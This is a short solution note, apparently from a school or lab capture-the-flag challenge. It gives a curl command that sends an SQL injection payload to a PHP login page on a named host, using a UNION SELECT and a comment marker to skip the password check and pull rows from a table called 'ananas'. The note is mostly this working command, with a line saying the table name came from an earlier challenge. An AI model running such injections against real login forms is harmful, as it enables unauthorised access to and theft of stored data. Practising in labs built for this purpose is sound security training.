"""
solution :
    curl -X POST http://hlabs.helb-prigogine.be:6543/plankton.php -d "username=admin' UNION SELECT * FROM ananas -- &password=password";

sql injection to retrieve data from 'ananas' table

i know ananas table exist because of precedent challenge
output in planktonJr.html
"""